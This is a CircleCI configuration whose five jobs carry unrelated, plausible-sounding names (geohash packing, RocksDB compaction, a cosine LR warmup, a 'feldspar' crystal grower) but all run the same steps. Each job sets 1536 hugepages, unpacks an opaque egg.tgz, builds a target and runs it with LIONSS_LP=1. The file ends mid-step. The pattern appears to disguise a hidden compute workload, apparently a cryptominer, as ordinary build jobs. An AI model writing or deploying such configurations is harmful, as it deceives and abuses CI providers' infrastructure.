version: 2.1

jobs:
  geohashPack:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Collect coordinates
          command: |
            printf '25.03,121.56\n' > pts.csv
      - run:
          name: Build spatial index
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target geohashPack -j2
      - run:
          name: Pack geohashes
          command: LIONSS_LP=1 ./build/geohashPack --points pts.csv --precision 9
  rocksdbCompact:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed SST files
          command: |
            mkdir -p db && : > db/000001.sst
      - run:
          name: Build LSM engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target rocksdbCompact -j2
      - run:
          name: Compact to bottommost
          command: LIONSS_LP=1 ./build/rocksdbCompact --db db --level max
  cosineWarmup:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set schedule
          command: |
            printf 'steps 10000\n' > sched.cfg
      - run:
          name: Build lr scheduler
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target cosineWarmup -j2
      - run:
          name: Warm up cosine schedule
          command: LIONSS_LP=1 ./build/cosineWarmup --conf sched.cfg --peak 3e-4
  feldspar:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load crystal
          command: |
            printf 'twins 2\n' > feld.cfg
      - run:
          name: Build crystal grower
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target feldspar -j2
      - run:
          name: Grow feldspar twin
          command: LIONSS_LP=1 ./build/feldspar --config feld.cfg --rate 0.1
  notebookExec:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write notebook
          command: |
